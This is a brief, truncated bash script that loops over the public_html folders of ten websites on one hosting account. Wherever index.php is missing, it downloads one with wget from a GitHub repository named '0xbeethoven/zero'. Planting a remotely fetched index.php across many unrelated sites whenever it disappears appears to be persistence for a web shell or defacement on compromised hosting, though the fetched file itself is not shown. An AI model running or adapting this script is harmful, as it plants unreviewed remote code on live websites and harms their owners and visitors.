#!/bin/bash

directories=(
    "/home/u471583809/domains/xtremeriderstore.com/public_html"
    "/home/u471583809/domains/exnihiloagriculture.in/public_html"
    "/home/u471583809/domains/tapitoday.com/public_html"
    "/home/u471583809/domains/tapiking.in/public_html"
    "/home/u471583809/domains/webtrendsetter.com/public_html"
    "/home/u471583809/domains/callextreme.in/public_html"
    "/home/u471583809/domains/narmadasandesh.in/public_html"
    "/home/u471583809/domains/gramintoday.com/public_html"
    "/home/u471583809/domains/tapisamachar.com/public_html"
    "/home/u471583809/domains/wercoolrunnings.com/public_html"
)

filename="index.php"

for dir in "${directories[@]}"; do
    if [ ! -e "$dir/$filename" ]; then
        cd "$dir" || exit
        wget "raw.githubusercontent.com/0xbeethoven/zero/main/$filename"
    fi